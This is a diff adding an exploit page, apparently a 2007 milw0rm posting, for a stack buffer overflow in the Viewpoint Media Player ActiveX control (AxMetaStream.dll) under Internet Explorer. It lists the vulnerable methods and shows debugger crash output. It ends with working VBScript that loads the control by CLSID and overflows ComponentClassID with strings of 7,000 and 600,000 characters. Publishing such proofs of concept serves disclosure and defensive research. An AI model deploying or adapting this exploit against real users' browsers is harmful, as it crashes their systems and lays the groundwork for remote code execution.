@@ -1,0 +1,115 @@
+<pre>
+<code><span style="font: 10pt Courier New;"><span class="general1-symbol"><body bgcolor="#E0E0E0">-----------------------------------------------------------------------------
+ <b>Viewpoint Media Player for IE 3.2 (AxMetaStream.dll) Remote Stack Overflow</b>
+ url: http://www.viewpoint.com
+
+ Author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+
+ <b><font color='red'>This was written for educational purpose. Use it at your own risk.
+ Author will be not responsible for any damage.</font></b>
+
+ Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
+
+ <b>Technical details:</b>
+ File: AxMetaStream.dll
+ Version: 3.3.2.26 (other versions may also be vulnerable)
+ MD5 Hash: 3163B59E1C568C8C6EACA1EAB06FA851
+
+ <b>Marked as:
+ RegKey Safe for Script: True
+ RegKey Safe for Init: True
+ Implements IObjectSafety: True
+ IDisp Safe: Safe for untrusted: caller,data
+ IPersist Safe: Safe for untrusted: caller,data
+ IPStorage Safe: Safe for untrusted: caller,data
+ KillBitSet: False</b>
+
+ <b>Bug description:</b>
+ The AxMetaStream activex contains various methods which accept parameters as String.
+ All these methods are vulnerable to a stack based buffer overflow when you pass an
+ overly long (greater than 6999 characters).
+ This is the list of all vulnerable methods:
+
+ <b>BroadcastKey()
+ BroadcastKeyFileURL()
+ Component()
+ ComponentClassID()
+ ComponentFileName()
+ ExtraProperty()
+ Properties()
+ RequiredVersions()
+ Source()
+ XMLText()</b>
+
+ <b>Product description (from <a href='http://en.wikipedia.org/wiki/Viewpoint_Media_Player'>http://en.wikipedia.org/wiki/Viewpoint_Media_Player</a>)</b>
+
+ Viewpoint Media Player is a web browser plug-in that enables users to
+ view 3D content and other rich media, such as Flash content and video,
+ on the Internet.
+ Viewpoint Media Player is included with AOL Instant Greetings, AIM
+ Themes and some other web applications.
+ Viewpoint Media Player is distributed with AOL, AIM, versions of Netscape,
+ certain Adobe products, and some retail computers sold today.
+ Despite this, these applications will most often work perfectly when Viewpoint
+ is removed.
+ A few companies, ranging from online retailers to auto manufacturers,
+ use Viewpoint Media Player as the graphics platform for interactive 3D tours
+ of their products.
+ Viewpoint Media Player powers product tours of the Toyota 4Runner and Sony laptop,
+ desktop, and server computing products. Despite the arguable usefulness of Viewpoint,
+ the vast majority of sites will stay away from it, and in practice not having
+ Viewpoint installed is not going to be an issue.
+
+ <b>This is a report at the moment of the overflow using first exploit:</b>
+
+ 1) Disassembly:
+    77C172E3   F3:A5            REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI] <- CRASH
+
+ 2) Registers:
+    EAX 026A26E4
+    ECX 000005B9
+    EDX 00000000
+    EBX 0269F00C
+    ESP 0188B668
+    EBP 0188B670
+    ESI 026A1000
+    EDI 0269F494 ASCII "BBBBBBBBBB..."
+    EIP 77C172E3 msvcrt.77C172E3
+
+ 3) Panel:
+    ECX=000005B9 (decimal 1465.)
+    DS:[ESI]=[026A1000]=???
+    ES:[EDI]=[0269F494]=42424242
+
+ 4) Dump:
+    02681494  42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
+    026814A4  42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
+    026814B4  42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
+    026814C4  42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
+    026814D4  42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
+--------------------------------------------------------------------------------
+<object classid='clsid:03F998B2-0E00-11D3-A498-00104B6EB52E' id='test' style='width: 1px; height: 1px'></object>
+
+<input language=VBScript onclick=expl1() type=button value='Exploit #1'>
+
+<input language=VBScript onclick=expl2() type=button value='Exploit #2'>
+
+<script language='VBScript'>
+ Sub expl1
+  For i = 1 to 3
+   buff = String(7000, "B")
+   test.ComponentClassID = buff
+  Next
+ End Sub
+
+ Sub Expl2
+  buff = String(600000, "B")
+  test.ComponentClassID = buff
+ End Sub
+</script>
+</span></span>
+</code></pre>
+
+# milw0rm.com [2007-11-06]
